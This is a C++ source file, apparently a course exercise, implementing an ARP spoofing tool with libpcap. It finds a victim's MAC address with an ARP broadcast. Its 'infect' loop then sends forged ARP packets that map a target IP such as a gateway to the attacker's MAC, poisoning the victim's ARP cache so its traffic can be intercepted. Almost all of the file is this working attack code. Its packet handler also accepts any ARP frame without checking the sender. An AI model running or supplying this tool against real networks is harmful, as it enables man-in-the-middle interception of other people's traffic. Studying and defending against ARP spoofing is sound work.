#include <cstdio>
#include <stdlib.h>
#include <string>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_mac_ip.h"

struct ethheader
{
	uint8_t ether_dhost[6];
	uint8_t ether_shost[6];
	uint16_t ether_type;
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() 
{
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip2> <target ip2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool is_ip_addr(const char* addr)
{
	char *token, *copy;

	copy = strdup(addr);
	int num, count = 0;
	// dangerous on multi threading 
	token = strtok(copy, ".");
	while(token != NULL) {
		for(int i = 0 ; token[i] != '\0' ; i++) {
			if(token[i] < '0' || token[i] > '9') {
				free(copy);
				return false;
			}
		}
		num = atoi(token);
		if(num < 0 || num > 255) {
				free(copy);
			return false;
		}
		token = strtok(NULL, ".");
		count ++;
	}

	if(count != 4 ) {
		free(copy);
		return false;
	}

	free(copy);
	return true;
}

bool validate(int argc, char* argv[])
{
	for(int i = 2 ; i < argc ; i ++) {
		if(!is_ip_addr(argv[i])) {
			return false;
		}
	}
	return true;
}

bool handle_packet(const u_char* packet, struct pcap_pkthdr* header, uint8_t* mac_buf)
{
	// ethernet
	struct ethheader *eth = (struct ethheader*)packet;
	uint32_t eth_size = sizeof(struct ethheader);
	if(ntohs(eth->ether_type) != 0x0806) return false;

	// arp
	memcpy(mac_buf, eth->ether_shost, sizeof(eth->ether_shost));
	return true;
	
	
	


}

void send_arp(pcap_t* handle, char* eth_dmac, char* eth_smac, char* smac, char* sip, char* tmac, char* tip)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(eth_dmac);
	packet.eth_.smac_ = Mac(eth_smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	packet.arp_.tmac_ = Mac(tmac);
	packet.arp_.tip_ = htonl(Ip(tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}
	



int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}
	if (!validate(argc, argv)) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	// pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// find my mac, ip
	char attacker_mac[18];
	get_mac_address(argv[1], attacker_mac, sizeof(attacker_mac));
	char attacker_ip[INET_ADDRSTRLEN];
	get_ip_address(argv[1], attacker_ip, sizeof(attacker_ip));

	// infect loop
	for(int i = 2 ; i < argc ; i = i + 2) {
		// find sender mac(victim)
		send_arp(handle, "ff:ff:ff:ff:ff:ff", attacker_mac, attacker_mac, attacker_ip, "00:00:00:00:00:00", argv[i]);

		// capture packet
		uint8_t temp[6];
		char sender_mac[18];
		while(true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if(res == 0) continue;
			if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex error\n");
				break;
			}
			printf("%u bytes caputured\n", header->caplen);
			bool finish = handle_packet(packet, header, temp);
			if(finish) {
				snprintf(sender_mac, sizeof(sender_mac),  "%02x:%02x:%02x:%02x:%02x:%02x", temp[0], temp[1], temp[2], temp[3], temp[4], temp[5]);
				printf("mac : %s\n", sender_mac);
				break;
			}
		}

		/*
		// find target mac(router)
		send_arp(handle, "ff:ff:ff:ff:ff:ff", attacker_mac, attacker_mac, attacker_ip, "00:00:00:00:00:00", argv[i + 1]);

		// capture packet
		char target_mac[18];
		while(true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if(res == 0) continue;
			if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex error\n");
				break;
			}
			printf("%u bytes caputured\n", header->caplen);
			bool finish = handle_packet(packet, header, temp);
			if(finish) {
				snprintf(target_mac, sizeof(target_mac),  "%02x:%02x:%02x:%02x:%02x:%02x", temp[0], temp[1], temp[2], temp[3], temp[4], temp[5]);
				break;
			}
		}
		
		*/
		// infect sender
		send_arp(handle, sender_mac, attacker_mac, attacker_mac, argv[i + 1], "00:00:00:00:00:00", argv[i]);

	}

	pcap_close(handle);
}
